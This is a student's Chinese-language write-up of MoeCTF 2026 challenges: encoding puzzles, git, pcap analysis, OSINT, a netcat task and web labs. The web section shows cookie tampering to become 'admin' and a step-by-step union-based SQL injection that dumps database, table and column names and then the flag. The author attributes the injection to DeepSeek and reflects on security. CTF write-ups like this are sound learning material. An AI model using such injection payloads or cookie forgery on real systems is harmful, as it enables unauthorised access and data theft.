1.一开始尝试运行镜像时，不知道在哪里查到的，我写的`docker run -d can_you_find_it:latest`，发现会闪退。我问了一下Deepseek，它说不知道哪里有问题，让我可以试试`docker run -it --entrypoint /bin/bash can_you_find_it:latest`，也确实成功了。但是在我事后复盘的时候，对这个标志感到好奇，就查了一下。原来`-d`时后台运行的意思，这里直接`docker run -it can_you_find_it:latest`就好了。唉AI真笨，`-d`都没看见。

2.就在刚刚我写上面那段话的时候，我还在傻傻分不清“参数”“选项”“标志”“argument”“option”“flag”。我用必应搜索`linux命令 flag 中文 标志 参数 选项`，感觉搜到的结果都不是我想要的。问一下Deepseek，我就弄懂了。唉AI也还是蛮好用的。

3.其实一开始`cat cache_meta.log`的时候，我看见一堆乱码就懵了。于是复制后去问AI了。这才注意到，开头就明晃晃的写着`PNG`。不过`PNG`设计的挺好啊，文件头就是'P''N''G'三个字母

4.这题出的真好啊，环环相扣。我在这里也学到了很多，不是上网查到的就是AI提醒我的。最后看见那半个二维码的时候，真是感觉，啊，天亮了

## Polyglot
读题，下载附件，猜测是文件里有七种编程语言

第一个，很明显是ruby，因为都告诉我们了。上网搜索在线ruby解释器。由`puts"\160\141\162\164\064\072\040\143\171\163\067\064\137\154\164\147\137\137\147\060\063\012"`得到`part4: cys74_ltg__g03`

第二个，由`printf` `%c`猜测是C语言。打开学校C语言老师发的小熊猫Dev-C++

```c
#include <stdio.h>
int main(void){
        printf ("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", 112,97,114,116,51,58,32,101,108,49,95,117,110,49,99,121,115,55,52,95,108,10 );
        return 0;
}
```

得到`part3: el1_un1cys74_l`

第三个，由`echo`猜测是bash。打开wsl2

```bash
$ echo -e "\0160\0141\0162\0164\0062\0072\0040\0157\0060\0137\0041\0147\0061\0146\0145\0154\0061\0137\0165\0156\0061";
part2: o0_!g1fel1_un1
```

第四个，不知道是啥。但是想到，不管是什么语言，后边就是输出的啊。似乎全篇来看，无非就是ASCII、十六进制、八进制，于是开始尝试走捷径（

```powershell
PS C:\Users\Juste> python
Python 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> s = '112,97,114,116,53,58,32,116,103,95,95,103,48,51,102,108,102,108,51,110,125,10'.split(',')
>>> for c in s:
...     print(chr(int(c)), end = '')
...
part5: tg__g03flfl3n}
```

第五个

```powershell
>>> s = '\x70;\x61;\x72;\x74;\x36;\x3a;\x20;\x66;\x6c;\x66;\x6c;\x33;\x6e;\x7d;\x7b;\x30;\x75;\x34;\x73;\x33;\x0a;'.spl\it(';')
>>> ''.join(s)
'part6: flfl3n}{0u4s3\n'  #一会手动删除一下这里的换行符'\n'，因为换行符大概是不考虑的
```

第六个

由`exec`猜测是Python。这里直接复制过来不太好看，总之运行后是`part1: mptnn__o0_!g1f`

第七个呢？

复制给AI，得知是中间那一大块空白。让AI给我们写一个脚本，由空格和制表符编码成二进制数（考虑空格和制表符分别为1、0和0、1的两种可能），再二进制转十进制转ASCII

经过漫长的与AI的交流，终于得到了一个勉强能接受的结果

```python
# decode_whitespace_filtered.py
raw_text = """     			  	 
	
     			 	  
	
     		 			
	
     			 	 
	
     	     
	
     				 		
	
     		    
	
     			 	 	
	
     		 	  
	
     			  		
	
     		  		
	
     		 		 	
	
     			    
	
     			 	  
	
     		 			 
	
     		 			 
	
     	 					
	
     	 					
	
     	 	 
	
  

"""

def decode_line(line, space_is_zero=True):
    bits = []
    for ch in line:
        if ch == ' ':
            bits.append('0' if space_is_zero else '1')
        elif ch == '\t':
            bits.append('1' if space_is_zero else '0')
    if not bits:
        return None
    bit_str = ''.join(bits)
    # 去掉前导零
    bit_str = bit_str.lstrip('0')
    if not bit_str:
        return None
    code = int(bit_str, 2)

    #调试
    print(f"bits: {bit_str} -> char: {chr(code)}")
    
    # 只保留可打印 ASCII（32~126），或特定字符
    if 32 <= code <= 126:
        return chr(code)
    else:
        return None  # 忽略不可打印字符

def decode_text(text, space_is_zero=True):
    lines = text.splitlines()
    result = []
    for line in lines:
        ch = decode_line(line, space_is_zero)
        if ch is not None:
            result.append(ch)
    return ''.join(result)

if __name__ == '__main__':
    print("=== 映射1: 空格=0, 制表符=1 ===")
    print(decode_text(raw_text, space_is_zero=True))
    print("\n=== 映射2: 空格=1, 制表符=0 ===")
    print(decode_text(raw_text, space_is_zero=False))

```

得到

```latex
=== 映射1: 空格=0, 制表符=1 ===
bits: 1110010 -> char: r
bits: 1 -> char: 
bits: 1110100 -> char: t
bits: 1 -> char: 
bits: 110111 -> char: 7
bits: 1 -> char: 
bits: 111010 -> char: :
bits: 1 -> char: 
bits: 100000 -> char:  
bits: 1 -> char: 
bits: 1111011 -> char: {
bits: 1 -> char: 
bits: 110000 -> char: 0
bits: 1 -> char: 
bits: 1110101 -> char: u
bits: 1 -> char: 
bits: 110100 -> char: 4
bits: 1 -> char: 
bits: 1110011 -> char: s
bits: 1 -> char: 
bits: 110011 -> char: 3
bits: 1 -> char: 
bits: 1101101 -> char: m
bits: 1 -> char: 
bits: 1110000 -> char: p
bits: 1 -> char: 
bits: 1110100 -> char: t
bits: 1 -> char: 
bits: 1101110 -> char: n
bits: 1 -> char: 
bits: 1101110 -> char: n
bits: 1 -> char: 
bits: 1011111 -> char: _
bits: 1 -> char: 
bits: 1011111 -> char: _
bits: 1 -> char: 
bits: 1010 -> char: 

bits: 1 -> char: 
rt7: {0u4s3mptnn__

=== 映射2: 空格=1, 制表符=0 ===
bits: 111110001101 -> char: ྍ
bits: 111110001011 -> char: ྋ
bits: 11111001000 -> char: ߈
bits: 11111000101 -> char: ߅
bits: 11111011111 -> char: ߟ
bits: 111110000100 -> char: ྄
bits: 11111001111 -> char: ߏ
bits: 111110001010 -> char: ྊ
bits: 11111001011 -> char: ߋ
bits: 111110001100 -> char: ྌ
bits: 11111001100 -> char: ߌ
bits: 111110010010 -> char: ྒ
bits: 111110001111 -> char: ྏ
bits: 111110001011 -> char: ྋ
bits: 111110010001 -> char: ྑ
bits: 111110010001 -> char: ྑ
bits: 111110100000 -> char: ྠ
bits: 111110100000 -> char: ྠ
bits: 111110101 -> char: ǵ
bits: 11 -> char: 


```

看一下我们得到的七个部分，没有发现啥。询问AI，突然发现每个part首尾有重叠的部分。再小心翼翼地手动拼接上，得到一个环状的字符串。注意到`{`和`}`，猜测这就是flag，于是让`{`开头、`}`结尾。再加上moectf，提交flag，错误

大概一两周后，我再看这题，不知道是之前没注意到还是后更新的，我突然发现这题有提示。于是花费15pts买下提示。第一个提示就是`正确的flag是leet可读的，也不需要添加flag头`。真伤心了。这我肯定是知道的啊。第二个提示是`竖着看7个部分或许可以有新的发现？`，哇，这真是没想到的思路

```latex
part1: mptnn__o0_!g1f
part2: o0_!g1fel1_un1
part3: el1_un1cys74_l
part4: cys74_ltg__g03
part5: tg__g03flfl3n}
part6: flfl3n}{0u4s3
part7: {0u4s3mptnn__
```

唉，如此显而易见

就差一步

竖着看真是一切都一目了然了

不过因为我实在是不想一个个敲出来，所以去问了一下AI有没有什么好方法。有的有的，有个叫`zip_longest`的东西

```python
parts = [
    "mptnn__o0_!g1f",
    "o0_!g1fel1_un1",
    "el1_un1cys74_l",
    "cys74_ltg__g03",
    "tg__g03flfl3n}",
    "flfl3n}{0u4s3",
    "{0u4s3mptnn__"
]

# 先横向打印，看看对齐效果
print("横向排列（每行一个part）：")
for p in parts:
    print(p)
print("\n纵向排列（按列读取）：")

from itertools import zip_longest

# 用空格补齐短行，使各列对齐
columns = zip_longest(*parts, fillvalue=' ')
for col in columns:
    # 把这一列的字符连接起来（从上到下）
    line = ''.join(col)
    print(line)

```

运行结果

```latex
横向排列（每行一个part）：
mptnn__o0_!g1f
o0_!g1fel1_un1
el1_un1cys74_l
cys74_ltg__g03
tg__g03flfl3n}
flfl3n}{0u4s3
{0u4s3mptnn__

纵向排列（按列读取）：
moectf{
p0lygl0
t_1s_fu
n!_7_l4
ngu4g3s
_1n_0n3
_f1l3}m
oectf{p
0lygl0t
_1s_fun
!_7_l4n
gu4g3s_
1n_0n3_
f1l3}  
```

## ez_BASE_revenge
注意到emoji，上网搜索base100在线转换网站，由“👄👱👞👱👑👢🐨👤👍👥👚🐫👛👏🐹👫👙👎👁🐪👜👡👉👭👋🐽👟👎👉🐼👁👍👈👣👑👧👋👢👫🐾👐👥👁👠👍🐼👫🐭👊👢👅🐭👋👌👁👊👙👍🐹🐩👘🐻🐽🐼👈👍👧👣👌🐻🐽👅👘🐿👟👏👜👣🐽👉👆🐿👟👉👑🐪👑👘👄👏👛🐫👋👍👅🐧👙👢🐨👊👚🐾👚🐴”得到`MzgzZk1mVnc4dXBtbWJ3ejRvTFhWREJVQlZpTktGYnJiVEt6SkN6TUJSbVB2aDFEQVplUDFNaHhXelFROHhRZ3ZaMXd4TVN0bk1ScGc=`

注意到等号，猜测base64。打开python解释器命令行

```python
>>> import base64
>>> len('MzgzZk1mVnc4dXBtbWJ3ejRvTFhWREJVQlZpTktGYnJiVEt6SkN6TUJSbVB2aDFEQVplUDFNaHhXelFROHhRZ3ZaMXd4TVN0bk1ScGc=')
104
>>> base64.b64decode('MzgzZk1mVnc4dXBtbWJ3ejRvTFhWREJVQlZpTktGYnJiVEt6SkN6TUJSbVB2aDFEQVplUDFNaHhXelFROHhRZ3ZaMXd4TVN0b\k1ScGc=')
b'383fMfVw8upmmbwz4oLXVDBUBViNKFbrbTKzJCzMBRmPvh1DAZeP1MhxWzQQ8xQgvZ1wxMStnMRpg'
```

注意到我没有思路了，打开赛博厨子`https://gchq.github.io/CyberChef/`。注意到右下角有神秘小按钮提示，自动识别出了base58。解码后，再次自动识别出了base32。解码后，得flag。

（下边是个人记录性质的心路历程

+ 其实我一开始看见emoji根本不知道是什么。是问了AI，才知道是base100
+ base64转码后，我其实先是又尝试了一次base64转码。但转完才发现，总长度不是4的倍数，并且结尾也没有等号
+ 我在这里卡了好久，后来也就把这题忘了。直到开学后一周了，突然看见这个题，就又想试一试。我依旧没思路，就去问问AI。AI说可以再试试其他base解码。这时候我突然就想起了赛博厨子。欸它真好用吧
+ 其实一开始我注意到题目是base的复仇，并且前期用到了base100和base64，所以我隐隐约约能感觉到，需要用到其他的base解码。不过我觉得各个base解码太麻烦了，就没研究。直到想起了赛博厨子。

## 你会git吗？
大一这一年接触过很多次git了，我直接就信心满满的下载附件

```bash
$ git log
$ git branch
$ git tag
$ git status
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   flag.txt

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    flag.txt

$ ls
$ git restore flag.txt
$ ls
flag.txt
$ cat flag.txt
flag is me,use base64 and put in moectf{}:ZzE3XzE1X3NvXzNhU3k=
$ python3
Python 3.12.3 (main, Jun 19 2026, 12:46:00) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> base64.b64decode('ZzE3XzE1X3NvXzNhU3k=')
b'g17_15_so_3aSy'
>>> exit
Use exit() or Ctrl-D (i.e. EOF) to exit
>>> exit()
```

另外还上网查了一下，有一个`git show`命令。前边的提交中果然有彩蛋哈哈

```bash
$ git log
$ git show HEAD^:flag.txt
            #我这没有flag，在往前看看？
$ git show HEAD^^:flag.txt
            #hint{你知道git端暂存区在哪吗？}
$ git show HEAD^^^:flag.txt
fatal: invalid object name 'HEAD^^^'.
$ git log
```

## Wedge in the Wire
下载附件，发现是`pcap`文件。询问AI，得知需要安装Wireshark

上网搜索`wireshark windows`，按着搜到的博客教程安装Wireshark

此时双击`tcp_traffic.pcap`，进入Wireshark

四处看看，发现有零散的`HTTP` `GET` `Python` `zip`字样

询问AI，得知可以用Wireshark进行筛选：选中带有`HTTP`字样的一行 - 右键选择`追踪流` - `TCP Stream`，这就看见了整个交流过程。注意到有`1.py` `duizhao.jpg` `%EF%BC%9F%EF%BC%81raputa%EF%BC%81%EF%BC%9F.zip`等字样

询问AI，得知可以用Wireshark直接下载文件：`文件` - `导出对象` - `HTTP...` - `全部保存`

发现下载下来三个文件：`%5c` `%EF%BC%9F%EF%BC%81raputa%EF%BC%81%EF%BC%9F` `duizhao.jpg`

+ `%5c`：注意到字符由百分号开头，猜测是URL编码。上网搜索在线转换网站，得知`%5c`是`\`。看着不舒服，尝试文件重命名为`\`，不行。原来是文件名不能包含`\`，才用的URL编码。（另外AI从出题人的角度猜测，也可能是因为服务器在生成目录列表的HTML链接时，会自动把非ASCII字符转成URL编码，所以这里才是URL编码。）用我习惯的`Notepad3`打开，发现似乎是`HTML`。给文件重命名成`%5c.html`，双击打开，原来是一个目录。（不过我怎么没在Wireshark那里直接下载到`1.py`呢？不清楚。可能是本来就没有也不需要它吧）（不过是不是这个目录`%5c`本来也是不需要的啊
+ `duizhao.jpg`：是楔形文字的对照表
+ `%EF%BC%9F%EF%BC%81raputa%EF%BC%81%EF%BC%9F.zip`：同样，因为文件名不能包含`?`，并且服务器会自动把非ASCII转成URL编码，所以文件名是URL编码。解压后得到`flag.jpg` `hint.txt`
    - 由`hint.txt`得知，大家都看不懂楔形文字，只需要一个个对照替换就好了（
    - 由`flag.jpg`对照得知flag。如下

$$
\begin{matrix}
m^a y^a s^a t^a i c^a \\\\
s^a c^a r^a i^a p^a t^a \\\\
i n^a \\\\
r^a a p^a u^a t^a a
\end{matrix}
$$

然后按照题目要求，单词大写、以_连接、包上`moectf{}`提交

## 一部电台
啊啊啊真出来了我去

<br>

打开附件`chall.wav`，发现是摩斯电码。尝试手动转换几个，发现太长了，好累啊。这才发现原来三十分钟呢。

上网搜索`wav 音频文件 摩斯电码 转换 在线网站`，找到一些在线工具网站（`https://morsecodeworld.org/audio-morse-code-decoder`）（`https://www.morsedecode.xyz/zh`），可以把wav文件直接转换成摩斯电码。但发现很多网站有文件大小限制。于是尝试先用`Audacity`把wav文件分成几段，十分钟一段。

转换后得到一大串数字。

有的网站会显示，基本上是4个数字一组的。而观察Audacity的频谱图也能看出，基本上是4个数字一组的。因此我们先使用Python把得到的一串数字，四个数字分成一组。

```python
s = '0 3 6 1 2 9 7 3 6 1 3 4 0 2 0 7 0 7 3 5 6 1 6 8 0 3 6 1 2 9 7 3 0 6 4 5 0 8 1 0 2 4 1 7 2 8 1 4 0 3 6 1 2 9 7 3 1 6 2 7 4 5 8 3 0 3 6 1 2 9 7 3 0 7 3 5 6 1 6 8 3 1 2 7 3 1 1 2 5 2 6 1 3 9 4 5 0 3 6 1 2 9 7 3 0 3 6 1 2 9 7 3 3 1 2 7 3 1 1 2 0 6 4 5 0 8 1 0 1 6 2 7 4 5 8 3 5 2 6 1 3 9 4 5 1 3 8 1 1 7 3 0 1 6 2 7 4 5 8 3 0 6 4 5 0 8 1 0 2 4 1 7 2 8 1 4 5 2 6 1 3 9 4 5 3 1 2 7 3 1 1 2 3 1 2 7 3 1 1 2 2 4 2 9 2 4 9 4 0 7 3 5 6 1 6 8 5 2 6 1 3 9 4 5 0 3 6 1 2 9 7 3 0 6 4 5 0 8 1 0 1 9 4 7 0 9 4 8 0 3 6 1 2 9 7 3 5 2 6 1 3 9 4 5 1 6 2 7 4 5 8 3 6 1 3 4 0 2 0 7 1 6 2 7 4 5 8 3 0 3 6 1 2 9 7 3 3 0 4 6 0 0 3 1 0 3 6 1 2 9 7 3 3 1 2 7 3 1 1 2 0 7 3 5 6 1 6 8 0 7 3 5 6 1 6 8 1 6 2 7 4 5 8 3 6 1 3 4 0 2 0 7 1 6 2 7 4 5 8 3 0 7 3 5 6 1 6 8 1 3 8 1 1 7 3 0 0 3 6 1 2 9 7 3 0 3 6 1 2 9 7 3 1 6 2 7 4 5 8 3 6 1 3 4 0 2 0 7 1 6 2 7 4 5 8 3 3 1 2 7 3 1 1 2 5 2 6 1 3 9 4 5 0 7 3 5 6 1 6 8 0 7 3 5 6 1 6 8 0 3 6 1 2 9 7 3 0 6 4 5 0 8 1 0 0 3 6 1 2 9 7 3 0 3 6 1 2 9 7 3 1 6 2 7 4 5 8 3 0 3 6 1 2 9 7 3 3 1 2 7 3 1 1 2 3 1 2 7 3 1 1 2 2 4 2 9 2 4 9 4 0 7 3 5 6 1 6 8 5 2 6 1 3 9 4 5 3 1 2 7 3 1 1 2 1 3 8 1 1 7 3 0 0 3 6 1 2 9 7 3 1 9 4 7 0 9 4 8 0 7 3 5 6 1 6 8 3 1 2 7 3 1 1 2 3 1 2 7 3 1 1 2 0 6 4 5 0 8 1 0 3 1 2 7 3 1 1 2'

s = s.split(' ')

splited = []

for i in range(len(s)):
    if i % 4 == 0:
        splited.append(s[i])
    else:
        splited[i//4] += s[i]

jointed_str = ' '.join(splited)
print(jointed_str)

```

整理好数据后，我们开始考虑解码。上网搜索`十进制数 ctf 四位一组`，无果。问AI，`上网查一下，ctf遇到四位十进制数一组`，得知原来有个东西叫中文电码。

上网搜索一下中文电码转换的在线网站（`https://www.qqxiuzi.cn/bianma/dianbao.php`），输入我们刚刚整理好的数据，得到一串汉字。

`公正诚信和谐公正友善敬业公正平等公正和谐法治自由公正公正法治友善平等自由富强平等友善敬业自由法治法治文明和谐自由公正友善爱国公正自由平等诚信平等公正民主公正法治和谐和谐平等诚信平等和谐富强公正公正平等诚信平等法治自由和谐和谐公正友善公正公正平等公正法治法治文明和谐自由法治富强公正爱国和谐法治法治友善法治`

注意到重复出现的词语，突然想起之前见过这个东西。上网搜索一下，想起来了，这是社会主义核心价值观编码。上网搜索网站进行解码（`https://ctf.bugku.com/tool/cvecode`），得到flag

## 星走路的黑历史
电脑端QQ搜索题目中的QQ号，搜到用户纪尘。点一下头像，鼠标悬停在签名，得到part1和hint：或许有谁留言？

查看他的QQ空间，打开留言板，注意到有一条留言。注意到打开的是QQ自带的窗口，我们尝试在标签页处右键，复制链接，在Edge浏览器打开。打开留言板后，f12打开开发者工具，选中那一条留言，注意到“快来抢沙发”其实前后藏着很多零宽字符，肯定藏了点什么。鼠标选中那个留言，右键，复制元素。上网搜索`零宽字符 在线网站`，搜到`https://tool.bfw.wiki/tool/1695021695027599.html`，解码后注意到part2和hint：see me

手机端QQ搜索题目中的QQ号，点击QQ空间，点击留言板，点击头像，进入资料卡，注意到有个标签，其中有个图片。仔细看，得到part3和hint：UID:3707029099120937。

注意到这个UID特别长，直接猜测是B站帐号。打开B站，搜索3707029099120937，发现什么也没有。尝试构造链接：点开自己的B站账号主页，发现链接格式是`https://space.bilibili.com/xxxxx`，于是进入`https://space.bilibili.com/3707029099120937`，来到洛依云天的B站主页。注意到一个2026.7.31发布的西电宣传图文，直接就是一个扫描二维码，得到最后一个part

观察各个part，注意到长度都是4的倍数，进行base64解码，放在一起得到flag

```python
>>> from base64 import b64decode
>>> b64decode('bW9lY3Rme1RoM190')
b'moectf{Th3_t'
>>> b64decode('ckB2M2xfb2ZfMHMx')
b'r@v3l_of_0s1'
>>> b64decode('bnRfaXNfaW50M3Jl')
b'nt_is_int3re'
>>> b64decode('c3RpbjlfSEBoNCF9')
b'stin9_H@h4!}'
```

interesting!

<br>

（下边是个人记录性质的心路历程

+ 为什么手机QQ看不见陌生人的个性签名啊？怎么电脑能看见啊？我真没招了。一开始怎么我也没找到part1，直到开学后我又尝试了一下这个题，在电脑端QQ突然看见了个性签名。
+ part1那里，QQ个性签名似乎不能直接复制，只能是鼠标悬停的时候查看。所以我是截图然后用微信的图片提取文字的。但最后base64转码的时候出来一个`moHctf{`，那肯定不对啊。原来是微信的图片提取文字把`l`看成`I`了
+ f12看到零宽字符的时候，我都惊呆了。就这五个字也能藏东西啊！（虽然理论上来说似乎零个字也能用零宽字符藏东西
+ part2的hint是see me。这里我真的绕了好大一圈啊。我的第一反应是，这个“me”指的是什么？会不会是2912933891这个用户？那可能是让我看看头像。会不会是零宽字符隐写的这句话？那可能是这个字符还有别的隐写信息。我先是尝试了手机保存头像再微信发到电脑、QQ官方API链接获取640*640的头像，再`xxd`，发现两种方法得到的`jpg`文件的`ffd9`后边内容还不一样。另外我肉眼盯着头像看了老半天，也没看出来视觉上的藏了什么东西，于是放弃头像这条路。然后我在在线网站，试了`200c` `200d` `202c` `feff`的所有可能的排列组合，结果只有一种结果有意义，也就是part2和hint的那个。在我满怀不甘的睡一觉之后，一天早上我突然发现：在QQ的手机端，对于陌生用户，搜索后直接打开个人主页，和，点击QQ空间点击留言板点击头像进入资料卡，显示的竟然是不一样的，而后者多了一个标签。就这样，我来到了下一个part。欸我去QQ为啥这样啊（AI说是QQ的电脑端资料卡、手机端资料卡、QQ空间资料卡，各自都不一样。原来是特意设计的吗，出题人还是对QQ太熟悉了。厉害。）
+ part3是个图片，AI说可以写个脚本，但我没有，我就是直接硬看的。这就导致我看了半天，一开始怎么也没看出来`fa`那个`f`，还又把`l`看成了`I`
+ 接下来的UID也是。一开始因为我注意到，QQ有个“Ta的游戏”，写着王者荣耀，我就猜是王者荣耀的UID。但我不玩王者荣耀啊，我就跑去问我玩王者荣耀的同学，结果他告诉我王者没有UID。问了AI才知道是B站UID。原来B站UID还能这么长啊
+ 哈哈B站评论区咋这么多人
+ 很多地方都是AI提示我的。比如f12显示的`&zwnj` `&zwj` `&#x202c` `&#xFEFF`其实是零宽字符隐写，jpg文件的结尾是`ffd9`，jpg文件除了末尾还可以在中间进行隐写，16位UID很可能是B站的UID，等等。

# 开发与运维基础
## 运维入门指北
`moectf{w31c0m3-70-7h3-w0r1d-0f-d3v0p5}`

## 当 Nginx 不在家
啊？咋就出来了？

<br>

看完入门指北，我只是大概对这些东西有个模模糊糊的印象，再加上之前或多或少有所耳闻，所以大概知道了这些东西是什么

看题目，似乎是要从3000端口拿到flag，还和socket有关

ssh连接后，`ls`，什么也没有

看一下提示，说会用到`nc`。尝试`nc 127.0.0.1 3000`，什么也没有

上网搜索`nc socket`，看见一篇标题为“利用nc命令接收socket数据”的博客，似乎很有关系，点进去看看。里边写道

> nc 服务器，开启 端口监听
>
> `# tcp`
>
> `nc -l 8000`
>
> `#udp`
>
> `nc -l -u 8000`
>
> 
>
> nc 客户端，连接 服务器
>
> `nc 127.0.0.1 8000`
>

于是我尝试一下`nc -l 3000`

竟然有反应

但不知怎的，是断断续续的

连在一起，似乎是flag，提交就通过了

```bash
moectf@ret2shell-1272-14355-1786612492:~$ nc -l 3000
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 22

{"ch": "moectf{W36_s"}moectf@ret2shell-1272-14355-1786612492:~$ nc -l 3000
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 12

{"ch": "3r"}moectf@ret2shell-1272-14355-1786612492:~$ nc -l 3000
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 44

{"ch": "VEr-PR0vlDE_ReI1@bLe-SeRvicE_For-t"}^[[Amoectf@ret2shell-1272-14355-1786612492:~$ nc -l 3000
POST /flag HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 20

{"ch": "hE-wOR1d0}"}
```

嗯，问了一下deepseek，又在网上查了一些东西，似乎是懂了

这里没有了高级的封装，所以需要`nc -l 3000`直接监听3000端口传来的数据

<br>

我大概是又接触了一下网络相关的知识吧

# Web 安全与渗透测试
## Web 安全与渗透测试入门指北
嗯把QQ群的群文件里的指北读完了，也没找到flag

然后来网站上突然看见除了pdf，还有一个zip附件，打开后是一个html，wow

F12打开开发者工具，在`<head>`的注释中看见flag，好耶

> 你发现了藏在 HTML 源代码中的信息！
>
> 
>
> flag: moectf{W3Lc0me_t0_th3_W0rLd_0f_w3BseCur1ty!!}
>
> 
>
> 欢迎来到 MoeCTF 2026 Web 方向。
>
> 请记住：前端隐藏不等于安全。
>

## 查分系统
一个大大的“请输入学号”

我直接就F12查看`元素`

原来是硬编码在HTML里的，但是怎么只显示15个呢，后边有省略号啊，后边会不会还有内容啊？我怎么点了半天点不开呢

于是浏览器最小化，用notepad3打开`system.html`，翻着翻着就发现了这么一个人

```html
    {
        "序号": 47,
        "学号": "25192837465",
        "姓名": "moectf",
        "专业": "计算机科学与技术",
        "Ⅰ-1-1": 10,
        "Ⅰ-1-2": 2,
        "Ⅰ-2-1": 2,
        "Ⅰ-2-2": 10,
        "Ⅰ-2-3": 9,
        "Ⅰ-2-4": 6,
        "Ⅰ-3-1": 1,
        "Ⅰ-3-2": 6,
        "Ⅰ-4-1": 3,
        "Ⅰ-4-2": 1,
        "Ⅰ-5-1": 0,
        "Ⅰ-5-2": 5,
        "Ⅱ-1-1": 6,
        "Ⅱ-1-2": 1,
        "Ⅱ-2-1": 6,
        "Ⅱ-2-2": 0,
        "Ⅱ-3-1": 4,
        "Ⅱ-3-2": 6,
        "Ⅱ-4-1": 2,
        "Ⅱ-4-2": 8,
        "Ⅱ-5": 0,
        "Ⅲ-1-1": 6,
        "Ⅲ-1-2": 4,
        "Ⅲ-1-3": 3,
        "Ⅲ-1-4": 6,
        "Ⅲ-2-1": 4,
        "Ⅲ-2-2": 9,
        "Ⅲ-2-3": 3,
        "总分": 123,
        "折合": "moectf{y0u_c@n_reAd_th3_h+nn1}"
    },
```

## 归途
启动环境，用浏览器打开，嗯很漂亮的网页。四处点一下，什么按钮也没有

F12打开开发者工具，查看`元素`，发现注释着的`Key2-QDBtNG9k`。于是尝试`ctrl f`搜索`Key`，无果。查看`控制台`，发现`Key1-N2ghNUkkTQ==`，注意到等号和字符个数，怀疑是base64，一会试试。查看`网络`，发现一个`getKey?id=3`，因为没仔细用过开发者工具所以四处点点，点了半天发现一个`Key3-M0szeUVuKw==`。

发现三个Key了，base64解码。该输入到哪里呢？试试F12的控制台，无果。去wsl2试试`curl -X POST`，无果。开始绝望开始无助开始无奈开始思考开始放弃。

突然间发现`网络`那里还有字我没看见，哎呀我去。`"message": "Do you know url params? Try to get Key4"`

上网搜索url params，因为不知道怎么用所以尝试在浏览器地址栏加上`/?key4` `?key=4` `?key` `?` `key?4`，最后猛然间又看见`网络`那里的奇怪格式，尝试`/getKey?id=4`，终于来到下一步。发现`{"key": "Key4-ZXJUaDFzbGE=", "message": "Do you know HTTP headers? Check it. Besides, Try to POST this api"}`

先在F12乱点一通，终于在`网络`找到`Key5-ITkzdA==`（唉不是`网络`咋这么多东西啊）

接着上网搜索`post api`，搜索半天。又来到wsl2，`curl -X POST -d '<四个Key用base64解码后拼在一起>' '127.0.0.1:<连接环境时的端口>/getKey?id=4'`，终于来到下一步。`{"key": "Key6-ZnwxbGFA", "message": "Try login!"}`

这个`try login`是啥啊，哪里有登陆吗，控制台也没有啊，post也没用啊，我真没招了。问问AI吧。哦原来是试试`/login`啊……

嗯很漂亮的登陆页面。上边的是示例吧。用户名和密码是什么呢？问了AI一句，于是我尝试了用户名为guest/admin/cat/alien/Alien/Key，密码为admin/<六个Key用base64解码后拼在一起>/guest，全都失败。突然间我反应过来，上边的会不会不是示例啊。晕。

登陆后跳转到`/info`，显示`Do you know cookie(不能吃)? Try to login the account of "admin"`。找到`cookie`，尝试登录，尝试新写一个cookie再登录，都不行。天啊。经过各种尝试，最后还是问了AI，原来是cookie中不改名称`user`只把值`guest`改成`admin`的意思。得到如下内容

```latex
Key7-NGFAZzY5Nmc5
有一个文件限制了爬虫可以访问的内容，是什么呢？

All Key body are a b64 string, try to decode
```

因为之前接触过爬虫，所以上网查一下就想起来了，于是查看`/robots.txt`，得到

```latex
User-agent: *
Disallow: /f13ggggg
```

上网查一下，原来这个是说爬虫不能访问的内容。于是我偏要访问`/f13ggggg`。得到最终合成钥匙的页面。`All the keys are a base64 string, try to decode it, enter the final string below!`

OHHHHHHHHH

终于

> 猫猫驾驶飞船回到了地球，这是猫猫给你的答谢！
>
> moectf{xxxxxxxxx}
>
> 🐱 喵～谢谢你帮助猫猫回家！
>

好累啊

但终于把猫猫送回家了吗

好耶

<br>

这题真的好长

还是说我初次接触所以觉得好长（

好有意思

出题人其实真的是一步步引导着的，奈何我真是刚入门所以有的时候对不上脑电波还要去问AI（

## 河湖小盗
考虑SQL注入

输入`1 and 1=1`可以，输入`1 and 1=2`不可以，说明存在数字型SQL注入的可能

依次输入`1 order by 1` `1 order by 2` `1 order by 3` `1 order by 4`，可看出一共有3列。接下来进行`union`

`1 and 1=2 union select database(),2,3`得知数据库名

`1 and 1=2 union select user(),2,3`得知用户名

`1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema=database()`得知目标表名`flag_table`

`1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='flag_table'`得知目标列名`flag`

`1 and 1=2 union select flag,2,3 from flag_table`得到flag

<br>

以上都不是我做的，是DeepSeek做的

所以我也没有提交这题的flag，毕竟这就是公告所说的`直接使用人工智能获取不属于你能力范围内的分数`

不过这里我想写一下我的感受

<br>

我是学计科的，既没有系统学习网安的知识，也没有正式地参加一场CTF

大一这一年，最多做的却是用AI写这个小东西写那个大东西，当然是带着空白的脑子

记得之前是在CS50还是CS61A，我就看见过SQL注入的相关介绍

在别的地方也零零散散地看见过谁谁谁对安全方面的警示

直到今天，我亲手进行了一次SQL注入，拿到了我本不应该拿到的东西

我才意识到，这真的很可怕

网络安全真的应该铭记于心

开发时偷懒的一行代码，不一定就会造成多么重大的后果

# 结束了
唉又结束了  
